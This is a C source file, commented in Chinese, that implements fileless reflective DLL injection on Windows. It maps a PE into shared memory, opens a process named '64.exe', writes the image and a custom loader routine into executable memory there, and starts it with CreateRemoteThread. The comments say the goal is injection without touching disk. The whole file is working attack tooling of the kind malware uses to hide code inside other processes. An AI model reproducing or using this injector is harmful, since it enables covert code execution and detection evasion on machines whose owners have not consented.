// dll 的反射注入
// 注意这里使用了无文件的 CreateFileMapping 方式，所以无法做到重复注入。
// 这里是希望完全的不落地实现 dll 注入。

#include<stdio.h>
#include<windows.h>
#include<tlhelp32.h>
#include<string.h>
#ifdef _WIN64
    #define ULONGLONG ULONGLONG
    #define PULONGLONG PULONGLONG
#else
    #define ULONGLONG ULONG
    #define PULONGLONG PULONG
#endif
#define G_V_SPACE "Global\\vttttv"
#define BUF_SIZE 1024*1024
typedef struct _PE_INFO {
    LPVOID  base;
    BOOL    reloc;
    LPVOID  Get_Proc;
    LPVOID  Load_DLL;
}PE_INFO , *LPE_INFO;
LPVOID ReadFile_in_Memory(char* FileName) {
    HANDLE f,h;
    LPVOID m;
    if ((f = CreateFileA(
                FileName,GENERIC_READ,FILE_SHARE_READ,0,
                OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL)
            ) == INVALID_HANDLE_VALUE){
        return NULL;
    }
    LPVOID pBuffer = (LPVOID)malloc(BUF_SIZE);
    ReadFile(f, pBuffer, BUF_SIZE, NULL, NULL);
    // 上面会比直接用 CreateFileMapping 传入文件打开会好一点
    // 因为当你想要用自用的代码片 shellcode 时，这里的插入会方便很多

    h = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, BUF_SIZE, G_V_SPACE);
    m = MapViewOfFile(h, FILE_MAP_ALL_ACCESS, 0, 0, BUF_SIZE);
    memcpy((LPVOID)m, pBuffer, BUF_SIZE);
    return m;
}
HANDLE Find_Process(char * processname) {
    PROCESSENTRY32 ProcessEntry = { 0 };
    HANDLE hProcessSnap, proc;
    ProcessEntry.dwSize = sizeof(PROCESSENTRY32);
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    BOOL bRet = Process32First(hProcessSnap,&ProcessEntry);
    while (bRet) {
        if(strcmp(processname,ProcessEntry.szExeFile) == 0) {
            proc = OpenProcess(PROCESS_ALL_ACCESS,0,ProcessEntry.th32ProcessID); 
            break;
        }
        bRet = Process32Next(hProcessSnap,&ProcessEntry);
    }
    return proc;
}
void AdjustPE(LPE_INFO pe) {
    PIMAGE_DOS_HEADER           dos;
    PIMAGE_NT_HEADERS           nt;
    LPVOID                      base;
    PIMAGE_IMPORT_DESCRIPTOR    import;
    PIMAGE_THUNK_DATA           Othunk,Fthunk;
    PIMAGE_BASE_RELOCATION      reloc;
    PIMAGE_TLS_DIRECTORY        tls;
    PIMAGE_TLS_CALLBACK*        CallBack;
    ULONGLONG*                  p,delta;
    BOOL        (*DLL_Entry)    (LPVOID, DWORD, LPVOID);
    LPVOID      (*Load_DLL)     (LPSTR);
    LPVOID      (*Get_Proc)     (LPVOID, LPSTR);
    base       = pe->base;
    Load_DLL   = pe->Load_DLL;
    Get_Proc   = pe->Get_Proc;
    dos        = (PIMAGE_DOS_HEADER)base;
    nt         = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    DLL_Entry  = base+nt->OptionalHeader.AddressOfEntryPoint;
    if(pe->reloc){
        if(nt->OptionalHeader.DataDirectory[5].VirtualAddress != 0){
            delta = (ULONGLONG)base-nt->OptionalHeader.ImageBase;
            reloc = (PIMAGE_BASE_RELOCATION)(base+nt->OptionalHeader.DataDirectory[5].VirtualAddress);
            while(reloc->VirtualAddress) {
                LPVOID  dest    = base+reloc->VirtualAddress;
                int     nEntry  = (reloc->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/2;
                PWORD   data    = (PWORD)((LPVOID)reloc+sizeof(IMAGE_BASE_RELOCATION));
                int i;
                for(i = 0; i<nEntry; i++,data++) {
                    if(((*data) >> 12) == 10) {
                        p = (PULONGLONG)(dest+((*data)&0xfff));
                        *p += delta;
                    }
                }
                reloc = (PIMAGE_BASE_RELOCATION)((LPVOID)reloc+reloc->SizeOfBlock);
            }
        }
    }
    if(nt->OptionalHeader.DataDirectory[1].VirtualAddress != 0){
        import = (PIMAGE_IMPORT_DESCRIPTOR)(base+nt->OptionalHeader.DataDirectory[1].VirtualAddress);
        while(import->Name) {
            LPVOID dll = (*Load_DLL)(base+import->Name);
            Othunk = (PIMAGE_THUNK_DATA)(base+import->OriginalFirstThunk);
            Fthunk = (PIMAGE_THUNK_DATA)(base+import->FirstThunk);
            if(!import->OriginalFirstThunk){
                Othunk = Fthunk;
            }
            while(Othunk->u1.AddressOfData) {
                if(Othunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    *(ULONGLONG *)Fthunk = (ULONGLONG)(*Get_Proc)(dll,(LPSTR)IMAGE_ORDINAL(Othunk->u1.Ordinal));
                }
                else {
                    PIMAGE_IMPORT_BY_NAME fnm = (PIMAGE_IMPORT_BY_NAME)(base+Othunk->u1.AddressOfData);
                    *(PULONGLONG)Fthunk = (ULONGLONG)(*Get_Proc)(dll,fnm->Name);
                }
                Othunk++;
                Fthunk++;
            }
            import++;
        }
    }
    if(nt->OptionalHeader.DataDirectory[9].VirtualAddress != 0){
        tls = (PIMAGE_TLS_DIRECTORY)(base+nt->OptionalHeader.DataDirectory[9].VirtualAddress);
        if(tls->AddressOfCallBacks != 0){
            CallBack = (PIMAGE_TLS_CALLBACK *)(tls->AddressOfCallBacks);
            while(*CallBack) {
                (*CallBack)(base,DLL_PROCESS_ATTACH,NULL);
                CallBack++;
            }
        }
    }
    (*DLL_Entry)(base,DLL_PROCESS_ATTACH,NULL);
}
int main(int i,char **arg) {
    if(i!=2) {
        printf("Usage %s <pe>",*arg);
        return 0;
    }
    HANDLE      proc;
    LPVOID      base,Rbase,Adj,Rbak;
    DWORD       Func_Size;
    PE_INFO     pe;
    PIMAGE_DOS_HEADER       dos;
    PIMAGE_SECTION_HEADER   sec;
    PIMAGE_NT_HEADERS       nt;
    printf("[+]Opening File...\n");
    if((base = ReadFile_in_Memory(*(arg+1))) == NULL) {
        printf("[-]File I/O Error");
        return 0;
    }
    dos = (PIMAGE_DOS_HEADER)base;
    if(dos->e_magic != 23117) {
        printf("[-]Invalid File");
        return 0;
    }
    nt = (PIMAGE_NT_HEADERS)(base+dos->e_lfanew);
    sec = (PIMAGE_SECTION_HEADER)((LPVOID)nt+24+nt->FileHeader.SizeOfOptionalHeader);
#ifdef _WIN64
    if(nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        printf("[-]This is not 64 bit pe");
        return 0;
    }
#else
    if(nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        printf("[-]This is not 32 bit pe");
        return 0;
    }
#endif
    printf("[+]Open Process.....\n");
    if((proc = Find_Process("64.exe")) == NULL) {
        printf("[-]Failed To Open Process");
        return 0;
    }
    printf("[+]Allocating Memory Into Remote Process\n");
    pe.reloc = 0;
    if((Rbase = VirtualAllocEx(proc,(LPVOID)nt->OptionalHeader.ImageBase,nt->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)) == NULL) {
        printf(" [!]Failed To Allocate Memory AT %#p\n [!]Trying Alternative\n", nt->OptionalHeader.ImageBase);
        pe.reloc = 1;
        if((Rbase = VirtualAllocEx(proc,NULL,nt->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)) == NULL) {
            printf("[-]Failed To Allocate Memory Into Remote Process\n");
            return 0;
        }
    }
    printf("[+]Copying Headers\n");
    WriteProcessMemory(proc,Rbase,base,nt->OptionalHeader.SizeOfHeaders,NULL);
    printf("[+]Copying Sections...\n");
    for(i = 0; i<nt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(proc,Rbase+sec->VirtualAddress,base+sec->PointerToRawData,sec->SizeOfRawData,NULL);
        sec++;
    }
    Func_Size = (DWORD)((ULONGLONG)main-(ULONGLONG)AdjustPE);
    pe.base = Rbase;
    // 记住，一定要用这种方式获取 windows 自带的这两个函数的地址才能兼容 tcc
    // 如果你用 pe.Get_Proc = GetProcAddress; 这样的方式会失败，因为 tcc 编译的过程和 gcc 不太一样。
    pe.Get_Proc = GetProcAddress(LoadLibraryA("kernel32"), "GetProcAddress");
    pe.Load_DLL = GetProcAddress(LoadLibraryA("kernel32"), "LoadLibraryA");

    printf("%d %d %d %d getproc:%16x loaddll:%16x\n", base, (LPVOID)nt->OptionalHeader.ImageBase,nt->OptionalHeader.SizeOfImage, Func_Size, pe.Get_Proc, pe.Load_DLL);
    Adj = VirtualAllocEx(proc,NULL,Func_Size+sizeof(pe),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    if(Adj == NULL) {
        printf("[-]Failed To Allocate Memory for PE adjusting\n");
        VirtualFreeEx(proc,Rbase,0,MEM_RELEASE);
        return 0;
    }
    WriteProcessMemory(proc,Adj,&pe,sizeof(pe),NULL);
    WriteProcessMemory(proc,Adj+sizeof(pe),AdjustPE,Func_Size,NULL);
    if(!CreateRemoteThread(proc,NULL,0,(LPTHREAD_START_ROUTINE)(Adj+sizeof(pe)),Adj,0,NULL)){
        printf("[-]Failed TO Adjust PE");
    }
    else{
        printf("[+]Adjusting PE And Executing....");
    }
    getchar();
    return 0;
}